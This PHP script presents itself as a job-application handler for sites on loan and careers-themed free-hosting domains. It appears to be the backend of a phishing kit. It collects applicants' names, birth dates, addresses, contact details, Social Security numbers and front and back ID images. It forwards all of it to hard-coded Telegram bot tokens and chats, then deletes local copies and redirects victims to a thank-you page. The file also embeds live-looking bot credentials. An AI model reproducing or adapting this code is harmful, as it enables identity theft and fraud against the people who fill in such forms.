<?php

// ============================================================================
// 🚦 INITIALIZATION & CONFIGURATION
// ============================================================================
ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);

// --- Helper to parse PHP size strings (e.g., "128M" -> bytes) ---
function parse_ini_size($size) {
    $unit = strtolower(substr($size, -1));
    $value = (int)$size;
    switch ($unit) {
        case 'g': $value *= 1024;
        case 'm': $value *= 1024;
        case 'k': $value *= 1024;
    }
    return $value;
}

// --- Pre‑flight check: are server upload limits high enough? ---
$required_max_mb = 100;
$upload_max_raw = ini_get('upload_max_filesize');
$post_max_raw = ini_get('post_max_size');
$upload_max_bytes = parse_ini_size($upload_max_raw);
$post_max_bytes = parse_ini_size($post_max_raw);
$required_bytes = $required_max_mb * 1024 * 1024;

if ($upload_max_bytes < $required_bytes || $post_max_bytes < $required_bytes) {
    // Try to auto‑increase via .htaccess / .user.ini (same as before)
    $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
    $target_dir = rtrim($doc_root, '/') . '/';
    $htaccess = $target_dir . '.htaccess';
    $user_ini = $target_dir . '.user.ini';
    $updated = false;

    if (is_writable($target_dir)) {
        if (file_exists($htaccess) && is_writable($htaccess)) {
            $content = file_get_contents($htaccess);
            if (strpos($content, 'php_value upload_max_filesize') === false) {
                file_put_contents($htaccess, "\nphp_value upload_max_filesize {$required_max_mb}M\nphp_value post_max_size " . ($required_max_mb + 20) . "M\n", FILE_APPEND);
                $updated = true;
            }
        } elseif (is_writable($target_dir)) {
            file_put_contents($htaccess, "php_value upload_max_filesize {$required_max_mb}M\nphp_value post_max_size " . ($required_max_mb + 20) . "M\n");
            $updated = true;
        }
        if (!$updated && file_exists($user_ini) && is_writable($user_ini)) {
            $content = file_get_contents($user_ini);
            if (strpos($content, 'upload_max_filesize') === false) {
                file_put_contents($user_ini, "\nupload_max_filesize = {$required_max_mb}M\npost_max_size = " . ($required_max_mb + 20) . "M\n", FILE_APPEND);
                $updated = true;
            }
        } elseif (!$updated && is_writable($target_dir)) {
            file_put_contents($user_ini, "upload_max_filesize = {$required_max_mb}M\npost_max_size = " . ($required_max_mb + 20) . "M\n");
            $updated = true;
        }
    }

    if (!$updated) {
        // If we cannot increase limits, show a friendly error and stop.
        http_response_code(413);
        echo "<!DOCTYPE html><html><head><title>Upload Limit Too Low</title></head><body>";
        echo "<h2>⚠️ Cannot upload large files</h2>";
        echo "<p>Your hosting provider limits file uploads to <strong>{$upload_max_raw}</strong> (and POST data to <strong>{$post_max_raw}</strong>).</p>";
        echo "<p>To upload files up to {$required_max_mb}MB, you need to increase these limits.</p>";
        echo "<ul><li>If you control the server, edit <code>php.ini</code> and restart.</li>";
        echo "<li>If you use shared hosting, contact support or use files smaller than {$upload_max_raw}.</li>";
        echo "<li>You can also try creating a <code>.htaccess</code> file manually with:<br>";
        echo "<code>php_value upload_max_filesize {$required_max_mb}M<br>php_value post_max_size " . ($required_max_mb + 20) . "M</code></li></ul>";
        echo "</body></html>";
        exit;
    } else {
        // Limits were increased via config file – but they may not take effect until next request.
        // Show a message asking the user to reload.
        echo "<p>Server upload limits have been updated. Please <a href='javascript:location.reload()'>reload the form</a>.</p>";
        exit;
    }
}

// --- Your existing site_map and security constants (unchanged) ---
$site_map = [
    "upstartloan.rf.gd" => [
        "bots" => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ["token" => "7683707216:AAFKB6Izdj c-M2mIaR_vRf-9Ha7CkEh7rA", "chat_id" => "7510889526"],
        ],
        "redirect" => "https://upstartloan.rf.gd/cache_site/thankyou.html"
    ],
    'paysphere.42web.io' => [
        'bots' => [
            ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
            ['token' => '8310302855:AAFBNgxxlAnaTtpWmJ7pVSP9kkW0j0TiwUY', 'chat_id' => '8160582785']
        ],
        'redirect' => 'https://paysphere.42web.io/cache_site/careers/all-listings.job.34092/thankyou.html'
    ],
];

define('MAX_FILE_SIZE', 100 * 1024 * 1024);          // 100MB per file
define('MAX_SUBMISSIONS_PER_HOUR', 10);
define('CSRF_TOKEN_LIFETIME', 3600);
define('ALLOWED_FILE_EXTENSIONS', ['jpg', 'jpeg', 'png', 'gif', 'pdf']);
define('ALLOWED_MIME_TYPES', ['image/jpeg', 'image/png', 'image/gif', 'application/pdf']);
define('TELEGRAM_MAX_FILE_SIZE', 50 * 1024 * 1024);

// ============================================================================
// 🧠 HELPER FUNCTIONS
// ============================================================================

/**
 * Escape text for Telegram HTML parse_mode
 */
function escape_telegram_html($text) {
    if (!is_string($text)) return '';
    $text = htmlspecialchars($text, ENT_NOQUOTES, 'UTF-8');
    return str_replace(['<', '>', '&'], ['&lt;', '&gt;', '&amp;'], $text);
}

/**
 * Generate and validate CSRF tokens
 */
function generate_csrf_token() {
    if (session_status() === PHP_SESSION_NONE) session_start();
    if (empty($_SESSION['csrf_token']) ||
        ($_SESSION['csrf_time'] ?? 0) < time() - CSRF_TOKEN_LIFETIME) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
        $_SESSION['csrf_time'] = time();
    }
    return $_SESSION['csrf_token'];
}

function validate_csrf_token($token) {
    if (session_status() === PHP_SESSION_NONE) session_start();
    return hash_equals($_SESSION['csrf_token'] ?? '', $token ?? '');
}

/**
 * Rate limiting by IP address
 */
function check_rate_limit($ip, $max_attempts = MAX_SUBMISSIONS_PER_HOUR, $window = 3600) {
    $log_dir = __DIR__ . '/logs/rate_limits';
    if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

    $safe_ip = preg_replace('/[^a-zA-Z0-9\.]/', '_', $ip);
    $rate_file = "$log_dir/$safe_ip.txt";

    $now = time();
    $attempts = [];

    if (file_exists($rate_file)) {
        $content = file_get_contents($rate_file);
        $attempts = array_filter(
            explode("\n", trim($content)),
            fn($t) => !empty($t) && (int)$t > $now - $window
        );
    }

    if (count($attempts) >= $max_attempts) return false;

    $attempts[] = $now;
    file_put_contents($rate_file, implode("\n", $attempts));
    return true;
}

/**
 * Secure logging – redacts sensitive data
 */
function log_entry($msg, $sensitive_data = []) {
    $log_dir = __DIR__ . '/logs';
    if (!is_dir($log_dir)) mkdir($log_dir, 0755, true);

    $log_file = "$log_dir/job_applications.log";

    $redactions = [
        '/\b\d{3}-\d{2}-\d{4}\b/' => '[SSN_REDACTED]',
        '/email[=:]\s*[^\s,]+/i' => 'email=[REDACTED]',
        '/phone[=:]\s*[^\s,]+/i' => 'phone=[REDACTED]',
    ];
    foreach ($redactions as $pattern => $replacement) {
        $msg = preg_replace($pattern, $replacement, $msg);
    }
    foreach ($sensitive_data as $key => $value) {
        if (!empty($value)) {
            $msg = str_replace($value, "[REDACTED:$key]", $msg);
        }
    }

    $entry = sprintf("[%s] %s\n", date('Y-m-d H:i:s'), $msg);
    file_put_contents($log_file, $entry, FILE_APPEND | LOCK_EX);
}

/**
 * Validate uploaded file with comprehensive checks
 */
function validate_uploaded_file($file_key) {
    if (!isset($_FILES[$file_key])) {
        return ['valid' => false, 'error' => 'File field not present'];
    }

    $file = $_FILES[$file_key];

    // Handle array-style file inputs
    if (is_array($file['name'])) {
        foreach (['name', 'type', 'tmp_name', 'error', 'size'] as $prop) {
            if (isset($file[$prop][0])) {
                $file[$prop] = $file[$prop][0];
            }
        }
    }

    $error_codes = [
        UPLOAD_ERR_INI_SIZE   => 'File exceeds server limit (upload_max_filesize)',
        UPLOAD_ERR_FORM_SIZE  => 'File exceeds form MAX_FILE_SIZE limit',
        UPLOAD_ERR_PARTIAL    => 'File partially uploaded',
        UPLOAD_ERR_NO_FILE    => 'No file uploaded',
        UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
        UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
        UPLOAD_ERR_EXTENSION  => 'Upload blocked by PHP extension'
    ];

    $error = $file['error'] ?? UPLOAD_ERR_NO_FILE;
    if ($error !== UPLOAD_ERR_OK) {
        return ['valid' => false, 'error' => $error_codes[$error] ?? "Unknown error ($error)"];
    }

    if (!is_uploaded_file($file['tmp_name'])) {
        return ['valid' => false, 'error' => 'File validation failed (not an uploaded file)'];
    }

    if (($file['size'] ?? 0) > MAX_FILE_SIZE) {
        return ['valid' => false, 'error' => sprintf('File too large (max %.2f MB)', MAX_FILE_SIZE / 1024 / 1024)];
    }

    $original_name = $file['name'] ?? '';
    $ext = strtolower(pathinfo($original_name, PATHINFO_EXTENSION));
    if (!in_array($ext, ALLOWED_FILE_EXTENSIONS)) {
        return ['valid' => false, 'error' => "Invalid file type: .$ext"];
    }

    if (class_exists('finfo')) {
        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime = finfo_file($finfo, $file['tmp_name']);
        finfo_close($finfo);

        $mime_valid = in_array($mime, ALLOWED_MIME_TYPES) ||
                      (strpos($mime, 'image/') === 0 && in_array($ext, ['jpg', 'jpeg', 'png', 'gif']));
        if (!$mime_valid) {
            return ['valid' => false, 'error' => "Invalid MIME type: $mime"];
        }
    }

    return ['valid' => true, 'file' => $file, 'ext' => $ext];
}

/**
 * Save uploaded file securely
 */
function save_uploaded_file($file_info, $prefix) {
    $upload_dir = __DIR__ . '/.secure_uploads/';
    if (!is_dir($upload_dir)) {
        if (!mkdir($upload_dir, 0700, true)) {
            log_entry("❌ Failed to create upload directory: $upload_dir");
            return null;
        }
    }

    // Create .htaccess to prevent direct web access
    $htaccess = $upload_dir . '.htaccess';
    if (!file_exists($htaccess)) {
        file_put_contents($htaccess, "Deny from all\n");
    }

    $safe_name = sprintf(
        "%s_%d_%s.%s",
        preg_replace('/[^a-z0-9]/i', '_', $prefix),
        time(),
        bin2hex(random_bytes(16)),
        $file_info['ext']
    );

    $destination = $upload_dir . $safe_name;

    if (move_uploaded_file($file_info['file']['tmp_name'], $destination)) {
        chmod($destination, 0600);
        return $destination;
    }

    log_entry("❌ move_uploaded_file failed for {$file_info['file']['tmp_name']} → $destination");
    return null;
}

/**
 * Send message to Telegram with retry logic
 */
function send_telegram_message($bot_token, $chat_id, $text, $parse_mode = 'HTML', $retries = 3) {
    $bot_token = str_replace(' ', '', trim($bot_token));
    $url = "https://api.telegram.org/bot$bot_token/sendMessage";

    for ($attempt = 1; $attempt <= $retries; $attempt++) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => [
                'chat_id' => $chat_id,
                'text' => $text,
                'parse_mode' => $parse_mode,
                'disable_web_page_preview' => true
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_USERAGENT => 'LabFormHandler/1.0'
        ]);

        $result = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        curl_close($ch);

        if ($curl_error) {
            log_entry("⚠️ cURL error (attempt $attempt): $curl_error");
            sleep(pow(2, $attempt));
            continue;
        }

        $response = json_decode($result, true);
        if (isset($response['ok']) && $response['ok'] === true) {
            return true;
        }

        $error_desc = $response['description'] ?? 'Unknown error';
        log_entry("⚠️ Telegram API error (attempt $attempt): $error_desc");
        if ($http_code >= 400 && $http_code < 500) break;
        sleep(pow(2, $attempt));
    }
    return false;
}

/**
 * Send file to Telegram with proper endpoint selection and size check
 */
function send_telegram_file($bot_token, $chat_id, $file_path, $caption, $retries = 3) {
    if (!file_exists($file_path)) return false;

    // Telegram cannot send files larger than 50MB
    $file_size = filesize($file_path);
    if ($file_size > TELEGRAM_MAX_FILE_SIZE) {
        log_entry("❌ File too large for Telegram: " . basename($file_path) . " (" . round($file_size/1024/1024,2) . " MB)");
        return false;
    }

    $bot_token = str_replace(' ', '', trim($bot_token));
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file_path);
    finfo_close($finfo);

    $is_image = strpos($mime, 'image/') === 0;
    $endpoint = $is_image ? 'sendPhoto' : 'sendDocument';
    $field_name = $is_image ? 'photo' : 'document';

    $url = "https://api.telegram.org/bot$bot_token/$endpoint";

    for ($attempt = 1; $attempt <= $retries; $attempt++) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => [
                'chat_id' => $chat_id,
                $field_name => new CURLFile(realpath($file_path)),
                'caption' => $caption,
                'parse_mode' => 'HTML'
            ],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 60
        ]);

        $result = curl_exec($ch);
        $curl_error = curl_error($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($curl_error) {
            log_entry("⚠️ File upload cURL error (attempt $attempt): $curl_error");
            sleep(pow(2, $attempt));
            continue;
        }

        $response = json_decode($result, true);
        if (isset($response['ok']) && $response['ok'] === true) {
            return true;
        }

        $error_desc = $response['description'] ?? 'Unknown error';
        log_entry("⚠️ File upload API error (attempt $attempt): $error_desc");
        if ($http_code >= 400 && $http_code < 500) break;
        sleep(pow(2, $attempt));
    }
    return false;
}

// ============================================================================
// 🚨 EARLY CHECKS (post_max_size / upload_max_filesize) - FIXED
// ============================================================================
function get_bytes_from_ini($value) {
    $unit = strtolower(substr($value, -1));
    $num = (int)$value;
    switch ($unit) {
        case 'g': $num *= 1024;
        case 'm': $num *= 1024;
        case 'k': $num *= 1024;
    }
    return $num;
}

$max_post_size_str = ini_get('post_max_size');
$max_upload_size_str = ini_get('upload_max_filesize');
$max_post_bytes = get_bytes_from_ini($max_post_size_str);
$max_upload_bytes = get_bytes_from_ini($max_upload_size_str);
$content_length = $_SERVER['CONTENT_LENGTH'] ?? 0;

if ($content_length > $max_post_bytes) {
    http_response_code(413);
    exit("Request too large. Maximum POST size is {$max_post_size_str}.");
}

if (empty($_POST) && empty($_FILES) && $content_length > 0) {
    http_response_code(413);
    exit("The uploaded data exceeds the server's maximum POST size ({$max_post_size_str}).");
}

// ============================================================================
// 🎯 MAIN REQUEST HANDLER
// ============================================================================

// 1. Origin Verification
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$parsed = parse_url($referer);
$domain = $parsed['host'] ?? 'unknown';
$config = $site_map[$domain] ?? null;

if (!$config || empty($config['bots']) || empty($config['redirect'])) {
    http_response_code(403);
    log_entry("❌ Access denied: Unauthorized origin ($domain)");
    exit("Access denied");
}

// 2. Method Check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit("Method not allowed");
}

// 3. CSRF Protection
if (!validate_csrf_token($_POST['csrf_token'] ?? '')) {
    http_response_code(403);
    log_entry("❌ CSRF validation failed for $domain");
    exit("Invalid request token");
}

// 4. Rate Limiting
$ip = $_SERVER['HTTP_CLIENT_IP'] ??
      $_SERVER['HTTP_X_FORWARDED_FOR'] ??
      $_SERVER['REMOTE_ADDR'] ??
      'unknown';
if (strpos($ip, ',') !== false) {
    $ip = trim(explode(',', $ip)[0]);
}
$ip = filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'unknown';

if (!check_rate_limit($ip)) {
    http_response_code(429);
    log_entry("❌ Rate limit exceeded for IP: $ip");
    exit("Too many submissions. Please wait before trying again.");
}

// ============================================================================
// 📋 DATA VALIDATION LAYER
// ============================================================================

$errors = [];
$post_data = $_POST ?? [];

// Required text fields
$required_fields = [
    ['path' => 'q11_fullName.first', 'label' => 'First name'],
    ['path' => 'q11_fullName.last', 'label' => 'Last name'],
    ['path' => 'q12_emailAddress', 'label' => 'Email address'],
    ['path' => 'q13_phoneNumber13.full', 'label' => 'Phone number'],
    ['path' => 'q14_positionApplied', 'label' => 'Position applied for']
];

foreach ($required_fields as $field) {
    $value = $post_data;
    foreach (explode('.', $field['path']) as $key) {
        $value = $value[$key] ?? null;
    }
    if (!is_string($value) || trim($value) === '') {
        $errors[] = $field['label'] . ' is required';
    }
}

// Email validation
$email = $post_data['q12_emailAddress'] ?? '';
if (!empty($email) && !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    $errors[] = 'Invalid email format';
}

// Required file uploads
$required_uploads = [
    'q17_uploadYour' => 'Front ID image',
    'q26_identityVerification' => 'Back ID image'
];

$uploaded_files = [];
$upload_results = [];

foreach ($required_uploads as $field => $label) {
    $validation = validate_uploaded_file($field);

    if (!$validation['valid']) {
        $errors[] = "$label: " . $validation['error'];
        $upload_results[$field] = null;
    } else {
        $saved_path = save_uploaded_file($validation, preg_replace('/[^a-z0-9]/i', '_', $field));
        if (!$saved_path) {
            $errors[] = "$label: Failed to save file";
            $upload_results[$field] = null;
        } else {
            $uploaded_files[$field] = $saved_path;
            $upload_results[$field] = $saved_path;
        }
    }
}

if (!empty($errors)) {
    log_entry("❌ Validation failed for $ip: " . implode('; ', $errors));
    http_response_code(400);

    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
        header('Content-Type: application/json');
        echo json_encode(['success' => false, 'errors' => $errors]);
    } else {
        echo "Submission error: " . htmlspecialchars(implode(', ', $errors));
    }
    exit;
}

// ============================================================================
// 📦 DATA PREPARATION (ESCAPED FOR TELEGRAM HTML)
// ============================================================================

$first = escape_telegram_html(trim($post_data['q11_fullName']['first'] ?? ''));
$middle = escape_telegram_html(trim($post_data['q11_fullName']['middle'] ?? ''));
$last = escape_telegram_html(trim($post_data['q11_fullName']['last'] ?? ''));
$full_name = trim("$first $middle $last");

$dob = sprintf("%04d-%02d-%02d",
    (int)($post_data['q18_birthDate']['year'] ?? 0),
    (int)($post_data['q18_birthDate']['month'] ?? 0),
    (int)($post_data['q18_birthDate']['day'] ?? 0)
);
$dob = ($dob !== '0000-00-00') ? escape_telegram_html($dob) : 'Not provided';

$address_parts = array_filter([
    $post_data['q16_currentAddress']['addr_line1'] ?? '',
    $post_data['q16_currentAddress']['addr_line2'] ?? '',
    $post_data['q16_currentAddress']['city'] ?? '',
    $post_data['q16_currentAddress']['state'] ?? '',
    $post_data['q16_currentAddress']['postal'] ?? ''
], 'trim');
$address = escape_telegram_html(implode(', ', $address_parts)) ?: 'Not provided';

$email = escape_telegram_html($post_data['q12_emailAddress'] ?? '');
$phone = escape_telegram_html($post_data['q13_phoneNumber13']['full'] ?? '');
$position = escape_telegram_html($post_data['q14_positionApplied'] ?? '');
$job_type = escape_telegram_html($post_data['q24_jobType'] ?? 'Not specified');
$source = escape_telegram_html($post_data['q21_howDid21'] ?? 'Unknown');

$ssn_raw = $post_data['q25_socSec'] ?? '';
$ssn_display = (strlen($ssn_raw) >= 4) ? '***-**-' . substr($ssn_raw, -4) : 'Not provided';

$timestamp = date('Y-m-d H:i:s');

// ============================================================================
// 📬 TELEGRAM RELAY - TEXT MESSAGE
// ============================================================================

$message = "<b>📋 New Application Received</b>\n\n" .
           "<b>👤 Name:</b> $full_name\n" .
           "<b>🎂 DOB:</b> $dob\n" .
           "<b>🏠 Address:</b> $address\n" .
           "<b>📧 Email:</b> $email\n" .
           "<b>📞 Phone:</b> $phone\n" .
           "<b>💼 Position:</b> $position\n" .
           "<b>📌 Type:</b> $job_type\n" .
           "<b>🗣 Source:</b> $source\n" .
           "<b>🔐 SSN:</b> $ssn_display\n\n" .
           "<b>🕒 Submitted:</b> $timestamp\n" .
           "<b>🌐 IP:</b> $ip\n" .
           "<b>📎 ID Files:</b> ✅ Attached";

$text_sent = true;
foreach ($config['bots'] as $bot) {
    if (empty($bot['token']) || empty($bot['chat_id'])) continue;
    if (!send_telegram_message($bot['token'], $bot['chat_id'], $message)) {
        $text_sent = false;
        log_entry("❌ Failed to send text message to Telegram for $domain using bot " . substr($bot['token'], 0, 10));
    }
}

// ============================================================================
// 📎 TELEGRAM RELAY - FILE UPLOADS
// ============================================================================

$files_sent = true;
$name_caption = "<b>$full_name</b>";

foreach ($uploaded_files as $field => $file_path) {
    $label = ($field === 'q17_uploadYour') ? 'Front ID' : 'Back ID';
    $caption = "📎 <b>$label</b> for $name_caption";

    $file_sent = false;
    foreach ($config['bots'] as $bot) {
        if (empty($bot['token']) || empty($bot['chat_id'])) continue;
        if (send_telegram_file($bot['token'], $bot['chat_id'], $file_path, $caption)) {
            $file_sent = true;
            break;
        }
    }
    if (!$file_sent) {
        $files_sent = false;
        log_entry("❌ Failed to send file $field to Telegram for $domain");
    }
}

// ============================================================================
// ✅ FINALIZATION & RESPONSE
// ============================================================================

$overall_success = $text_sent && $files_sent;

if ($overall_success) {
    log_entry("✅ Submission successful for $ip ($full_name) - Domain: $domain");

    foreach ($uploaded_files as $path) {
        if (file_exists($path)) @unlink($path);
    }

    ob_end_clean();
    header('Location: ' . $config['redirect'] . '?status=success');
    exit;
} else {
    log_entry("❌ Partial failure for $ip: text_sent=" . ($text_sent ? 'Y' : 'N') .
              ", files_sent=" . ($files_sent ? 'Y' : 'N'));

    http_response_code(502);

    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) &&
        strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Submission received but notification failed. Please contact support.'
        ]);
    } else {
        echo "⚠️ Your application was received, but we encountered an issue sending confirmation.\n" .
             "Reference ID: " . substr(md5($ip . $timestamp), 0, 8);
    }
    exit;
}
?>
